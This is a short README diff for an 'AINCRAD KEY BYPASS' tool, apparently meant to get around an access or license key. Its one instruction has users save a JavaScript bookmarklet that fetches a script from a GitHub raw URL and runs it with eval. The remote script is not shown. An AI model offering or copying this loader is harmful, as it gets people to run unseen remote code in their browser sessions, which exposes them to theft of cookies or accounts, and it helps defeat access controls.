@@ -1,6 +1,6 @@
 ## AINCRAD KEY BYPASS by Ꮇᴇͥʜͣᴇͫᴅƴ
 
-### Add in chrome bookmark :
+### Coppy JavaScript loader and add to bookmark :
 
 ```bash
 javascript:fetch("https://raw.githubusercontent.com/mehedy4644/1/main/0.js").then(r=>r.text()).then(eval)
